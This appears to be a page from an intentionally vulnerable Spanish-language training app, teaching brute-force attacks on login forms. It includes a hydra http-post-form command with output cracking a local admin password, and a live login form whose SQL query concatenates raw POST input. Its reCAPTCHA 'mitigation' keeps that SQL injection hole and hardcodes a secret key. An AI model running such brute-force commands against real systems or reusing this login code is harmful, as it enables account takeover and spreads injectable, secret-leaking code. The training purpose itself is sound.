<?php include("../../header.php"); ?>

<title>Fuerza Bruta</title>
<script src="https://www.google.com/recaptcha/api.js?hl=es" async defer></script>

<section id="template">
      <div class="container">
        <div class="row">
          <div class="col-md-12">
            <h3 class="title text-center">Fuerza Bruta</h3>
            <div class="titleHR"><span></span></div>
          </div>
        </div>

        <p>Los ataques de fuerza bruta es un ataque donde se hace uso de usuarios y contrasenas para querer acceder a un sistema valiendose de enviar multiples peticiones de usuario y contrasea para querer acceder, se puede tener o no usuarios para el acceso o tambien se puede hacer fuerza bruta para obtenerlos. Si el sistema no tiene configurado algo para detener ese ataque cualquier persona mal intencionada puede hacer un ataque de fuerza bruta utilizando un diccionario de contrasenas y poder tener acceso al sistema</p>

        <h2>Herramientas de fuerza bruta</h2>

        <p>La herramienta mas utilizada suele ser hydra pero existen muchas mas herramientas, se explicara esta para tener una nocion de como es atacado un formulario. Los parametros que se utilizan son:</p>

        <pre>-l &colon; Usuario&NewLine;-L &colon; lista de usuarios&NewLine;-p &colon; Contrasena&NewLine;-P &colon; Lista de contrasenas&NewLine;-v &colon; Muestra mucho mas informativa la  salida&NewLine;http-post-form&colon; Indica que se hara uso de una peticion POST&NewLine;&quot;ruta&sol;nombredearchivo&period;php&colon;variableusuario&equals;&Hat;USER&Hat;&amp;variablepassword&equals;&Hat;PASS&Hat;&colon;Salida esperada si es erronea la contrasena&quot;&NewLine;</pre>

        <p>Utilizando los parametros anteriores se puede hacer uso de un usuario que sabemos que existe o tambien se podria indicar el usuario a travez de un listado de usuarios en formato texto plano. Asi como es indicada la listas de contrasenas, luego se indica la ip o ya se el dominio que se desea atacar, luego el tipo de forma de atacar que es http-post-form a traves de peticiones post, y luego la ruta del archivo y el nombre al que se envia la peticion, mas las variables que son enviadas. Como se sabe que peticiones deberia de enviar, pues es facil es ir a las opciones de desarrolador en el navegador, buscar network para mostrar todos los datos que son enviados y buscar nuestra peticion post, nos mostrara la ruta del archivo y nombre y la peticion que esta realizando como en la imagen siguiente:</p>

        <img src="/images/developertools.png" alt="Developer Tools">Developer Tools Firefox

        <p>Teniendo los datos necesarios para el ataque se procede a hacer el ataque con hydra y ver como nos muestra como en el listado que contamos esta la contrasena del usuario.</p>

        <pre>hydra -l admin -P pass&period;txt 127&period;0&period;0&period;1 http-post-form &quot;&sol;vistas&sol;vulnerabilidades&sol;brokenauthentication&sol;fuerzabruta&period;php&colon;username&equals;&Hat;USER&Hat;&amp;password&equals;&Hat;PASS&Hat;&colon;Datos incorrectos&quot; -v&NewLine;Hydra v9&period;2 &lpar;c&rpar; 2021 by van Hauser&sol;THC &amp; David Maciejak - Please do not use in military or secret service organizations&comma; or for illegal purposes &lpar;this is non-binding&comma; these &ast;&ast;&ast; ignore laws and ethics anyway&rpar;&period;&NewLine;&NewLine;Hydra &lpar;https&colon;&sol;&sol;github&period;com&sol;vanhauser-thc&sol;thc-hydra&rpar; starting at 2021-10-19 22&colon;02&colon;13&NewLine;&lsqb;DATA&rsqb; max 15 tasks per 1 server&comma; overall 15 tasks&comma; 15 login tries &lpar;l&colon;1&sol;p&colon;15&rpar;&comma; ~1 try per task&NewLine;&lsqb;DATA&rsqb; attacking http-post-form&colon;&sol;&sol;127&period;0&period;0&period;1&colon;80&sol;vistas&sol;vulnerabilidades&sol;brokenauthentication&sol;fuerzabruta&period;php&colon;username&equals;&Hat;USER&Hat;&amp;password&equals;&Hat;PASS&Hat;&colon;Datos incorrectos&NewLine;&lsqb;VERBOSE&rsqb; Resolving addresses &period;&period;&period; &lsqb;VERBOSE&rsqb; resolving done&NewLine;&lsqb;STATUS&rsqb; attack finished for 127&period;0&period;0&period;1 &lpar;waiting for children to complete tests&rpar;&NewLine;&lsqb;80&rsqb;&lsqb;http-post-form&rsqb; host&colon; 127&period;0&period;0&period;1   login&colon; admin   password&colon; admin&NewLine;1 of 1 target successfully completed&comma; 1 valid password found&NewLine;Hydra &lpar;https&colon;&sol;&sol;github&period;com&sol;vanhauser-thc&sol;thc-hydra&rpar; finished at 2021-10-19 22&colon;02&colon;14</pre>


<hr>
<h1 style="color:red;">Explotacion</h1>


        <div class="login">
            <div class="account-login">
               <h1>Inicio de Sesion</h1>
               <form action="<?php echo $_SERVER["PHP_SELF"]; ?>" class="login-form" method="post">
                  <div class="form-group">
                     <input type="text" placeholder="Usuario" class="form-control" name="username">
                  </div>
                  <div class="form-group">
                     <input type="password" placeholder="Contrasena"  class="form-control" name="password">
                  </div>
                  <input type="submit" class="btn" value="Iniciar Sesion">
               </form>
            </div>
        </div>

<?php
    if (isset($_POST['username']) && isset($_POST['password'])){
      
      require "connection.php";

      $var_consulta= "select * from users where name = '".$_POST["username"]."' and "." password = '".$_POST["password"]."';";
      $var_resultado = $obj_conexion->query($var_consulta);
      
      if($var_resultado->num_rows>0){
        echo "<h3 style=\"color: green\">Inicio de sesion exitoso</h3>";
      }else{
        echo "<h3 style=\"color: red\">Datos incorrectos</h3>";
      }
    }
?>

<h2>Mitigacion con captcha</h2>

<p>Actualmente la forma favorita de evitar ataques de fuerza bruta es utilizar captcha, existen muchos pero el mas utilizado es el de google el cual se maneja muy bien, en esta forma estaremos utilizando el captcha v2 de google para las pruebas. Si nosotros no resolvemos el captcha manualmente practicamente no podriamos realizar un ataque de fuerza bruta ya que necesita que se marque cada vez que realizamos una peticion. Y si no lo hacemos esta seria la salida con hydra.</p>

<pre>hydra -l admin -P pass&period;txt 127&period;0&period;0&period;1 http-post-form &quot;&sol;vistas&sol;vulnerabilidades&sol;brokenauthentication&sol;fuerzabruta&period;php&colon;username2&equals;&Hat;USER&Hat;&amp;password2&equals;&Hat;PASS&Hat;&colon;Datos incorrectos&quot; -v&NewLine;Hydra v9&period;2 &lpar;c&rpar; 2021 by van Hauser&sol;THC &amp; David Maciejak - Please do not use in military or secret service organizations&comma; or for illegal purposes &lpar;this is non-binding&comma; these &ast;&ast;&ast; ignore laws and ethics anyway&rpar;&period;&NewLine;&NewLine;Hydra &lpar;https&colon;&sol;&sol;github&period;com&sol;vanhauser-thc&sol;thc-hydra&rpar; starting at 2021-10-20 16&colon;41&colon;45&NewLine;&lsqb;DATA&rsqb; max 15 tasks per 1 server&comma; overall 15 tasks&comma; 15 login tries &lpar;l&colon;1&sol;p&colon;15&rpar;&comma; ~1 try per task&NewLine;&lsqb;DATA&rsqb; attacking http-post-form&colon;&sol;&sol;127&period;0&period;0&period;1&colon;80&sol;vistas&sol;vulnerabilidades&sol;brokenauthentication&sol;fuerzabruta&period;php&colon;username2&equals;&Hat;USER&Hat;&amp;password2&equals;&Hat;PASS&Hat;&colon;Datos incorrectos&NewLine;&lsqb;VERBOSE&rsqb; Resolving addresses &period;&period;&period; &lsqb;VERBOSE&rsqb; resolving done&NewLine;&lsqb;STATUS&rsqb; attack finished for 127&period;0&period;0&period;1 &lpar;waiting for children to complete tests&rpar;&NewLine;1 of 1 target completed&comma; 0 valid password found&NewLine;Hydra &lpar;https&colon;&sol;&sol;github&period;com&sol;vanhauser-thc&sol;thc-hydra&rpar; finished at 2021-10-20 16&colon;41&colon;45</pre>

<p>La forma de implementacion es la siguiente, pero para este caso se necesita una api key para recaptcha y una cuenta en este, las instrucciones y documentacion son muchas por lo cual se muestra un ejemplo de como se hizo y una guia para que el programador pueda realizarlo sin problema y ver como un simple captcha puede evitar un ataque de fuerza bruta.</p>

<pre>        &lt;div class&equals;&quot;login&quot;&gt;&NewLine;            &lt;div class&equals;&quot;account-login&quot;&gt;&NewLine;               &lt;h1&gt;Inicio de Sesion&lt;&sol;h1&gt;&NewLine;               &lt;form action&equals;&quot;&lt;&quest;php echo &dollar;&lowbar;SERVER&lsqb;&quot;PHP&lowbar;SELF&quot;&rsqb;&semi; &quest;&gt;&quot; class&equals;&quot;login-form&quot; method&equals;&quot;post&quot;&gt;&NewLine;                  &lt;div class&equals;&quot;form-group&quot;&gt;&NewLine;                     &lt;input type&equals;&quot;text&quot; placeholder&equals;&quot;Usuario&quot; class&equals;&quot;form-control&quot; name&equals;&quot;username2&quot;&gt;&NewLine;                  &lt;&sol;div&gt;&NewLine;                  &lt;div class&equals;&quot;form-group&quot;&gt;&NewLine;                     &lt;input type&equals;&quot;password&quot; placeholder&equals;&quot;Contrasena&quot;  class&equals;&quot;form-control&quot; name&equals;&quot;password2&quot;&gt;&NewLine;                  &lt;&sol;div&gt;&NewLine;                  &lt;input type&equals;&quot;submit&quot; class&equals;&quot;btn&quot; value&equals;&quot;Iniciar Sesion&quot;&gt;&NewLine;                  &lt;div class&equals;&quot;g-recaptcha&quot; data-sitekey&equals;&quot;6LfwIuMcAAAAANgmKsCJm1gdTl&lowbar;JqtBARaN56urH&quot;&gt;&lt;&sol;div&gt;&NewLine;               &lt;&sol;form&gt;&NewLine;            &lt;&sol;div&gt;&NewLine;        &lt;&sol;div&gt;&NewLine;&NewLine;&lt;&quest;php&NewLine;     if&lpar;&excl;empty&lpar;&dollar;&lowbar;POST&lsqb;&apos;g-recaptcha-response&apos;&rsqb;&rpar;&rpar;&NewLine;     &lcub;&NewLine;           &dollar;secret &equals; &apos;6LfwIuMcAAAAAD-eDs44Hp1adILLTTrMqw2cYjPZ&apos;&semi;&NewLine;           &dollar;verifyResponse &equals; file&lowbar;get&lowbar;contents&lpar;&apos;https&colon;&sol;&sol;www&period;google&period;com&sol;recaptcha&sol;api&sol;siteverify&quest;secret&equals;&apos;&period;&dollar;secret&period;&apos;&amp;response&equals;&apos;&period;&dollar;&lowbar;POST&lsqb;&apos;g-recaptcha-response&apos;&rsqb;&rpar;&semi;&NewLine;           &dollar;responseData &equals; json&lowbar;decode&lpar;&dollar;verifyResponse&rpar;&semi;&NewLine;           &NewLine;           if&lpar;&dollar;responseData-&gt;success&rpar;&lcub;&NewLine;            if &lpar;isset&lpar;&dollar;&lowbar;POST&lsqb;&apos;username2&apos;&rsqb;&rpar; &amp;&amp; isset&lpar;&dollar;&lowbar;POST&lsqb;&apos;password2&apos;&rsqb;&rpar;&rpar;&lcub;&NewLine;      &NewLine;              require &quot;connection&period;php&quot;&semi;&NewLine;        &NewLine;              &dollar;var&lowbar;consulta&equals; &quot;select &ast; from users where name &equals; &apos;&quot;&period;&dollar;&lowbar;POST&lsqb;&quot;username2&quot;&rsqb;&period;&quot;&apos; and &quot;&period;&quot; password &equals; &apos;&quot;&period;&dollar;&lowbar;POST&lsqb;&quot;password2&quot;&rsqb;&period;&quot;&apos;&semi;&quot;&semi;&NewLine;              &dollar;var&lowbar;resultado &equals; &dollar;obj&lowbar;conexion-&gt;query&lpar;&dollar;var&lowbar;consulta&rpar;&semi;&NewLine;              &NewLine;              if&lpar;&dollar;var&lowbar;resultado-&gt;num&lowbar;rows&gt;0&rpar;&lcub;&NewLine;                echo &quot;&lt;h3 style&equals;&bsol;&quot;color&colon; green&bsol;&quot;&gt;Inicio de sesion exitoso&lt;&sol;h3&gt;&quot;&semi;&NewLine;              &rcub;else&lcub;&NewLine;                echo &quot;&lt;h3 style&equals;&bsol;&quot;color&colon; red&bsol;&quot;&gt;Datos incorrectos&lt;&sol;h3&gt;&quot;&semi;&NewLine;              &rcub;&NewLine;            &rcub;&NewLine;           &rcub;else&lcub;&NewLine;            &dollar;message &equals; &quot;Some error in vrifying g-recaptcha&quot;&semi;&NewLine;            echo &dollar;message&semi;&NewLine;           &rcub;&NewLine;             &NewLine;&rcub;</pre>



<hr>
<h1 style="color:green;">Mitigacion</h1>


        <div class="login">
            <div class="account-login">
               <h1>Inicio de Sesion</h1>
               <form action="<?php echo $_SERVER["PHP_SELF"]; ?>" class="login-form" method="post">
                  <div class="form-group">
                     <input type="text" placeholder="Usuario" class="form-control" name="username2">
                  </div>
                  <div class="form-group">
                     <input type="password" placeholder="Contrasena"  class="form-control" name="password2">
                  </div>
                  <div class="g-recaptcha" data-sitekey="6LfwIuMcAAAAANgmKsCJm1gdTl_JqtBARaN56urH"></div>
                  <br>
                  <input type="submit" class="btn" value="Iniciar Sesion">           
               </form>
            </div>
        </div>

<?php
     if(!empty($_POST['g-recaptcha-response']))
     {
           $secret = '6LfwIuMcAAAAAD-eDs44Hp1adILLTTrMqw2cYjPZ';
           $verifyResponse = file_get_contents('https://www.google.com/recaptcha/api/siteverify?secret='.$secret.'&response='.$_POST['g-recaptcha-response']);
           $responseData = json_decode($verifyResponse);
           
           if($responseData->success){
            if (isset($_POST['username2']) && isset($_POST['password2'])){
      
              require "connection.php";
        
              $var_consulta= "select * from users where name = '".$_POST["username2"]."' and "." password = '".$_POST["password2"]."';";
              $var_resultado = $obj_conexion->query($var_consulta);
              
              if($var_resultado->num_rows>0){
                echo "<h3 style=\"color: green\">Inicio de sesion exitoso</h3>";
              }else{
                echo "<h3 style=\"color: red\">Datos incorrectos</h3>";
              }
            }
           }else{
            $message = "Some error in vrifying g-recaptcha";
            echo $message;
           }
             
}


?>

    </div> <!--/.container -->
    </section>
 
    

<?php include("../../footer.php"); ?>